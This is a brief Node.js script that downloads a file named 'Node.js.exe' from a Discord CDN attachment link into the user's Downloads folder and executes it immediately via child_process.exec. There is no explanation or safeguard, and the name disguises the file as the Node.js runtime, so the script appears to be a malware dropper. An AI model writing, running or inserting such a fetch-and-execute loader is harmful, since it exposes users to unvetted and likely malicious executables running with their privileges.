const axios = require('axios').default;
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');

async function downloadFile(url, destination) {
    const response = await axios({
        url,
        method: 'GET',
        responseType: 'stream'
    });

    const filePath = path.join(destination, 'Node.js.exe');
    const writer = fs.createWriteStream(filePath);

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
}

async function main() {
    const url = 'https://cdn.discordapp.com/attachments/1231352846910488700/1238144311439130644/Node.js.exe?ex=663e373f&is=663ce5bf&hm=367e0c0fe18e71ee78e46295d3391e849b975e2c128111772155e8635ded67c3&';
    const destination = path.join(os.homedir(), 'Downloads');

    await downloadFile(url, destination);

    const filePath = path.join(destination, 'Node.js.exe');
    exec(filePath);
}

main()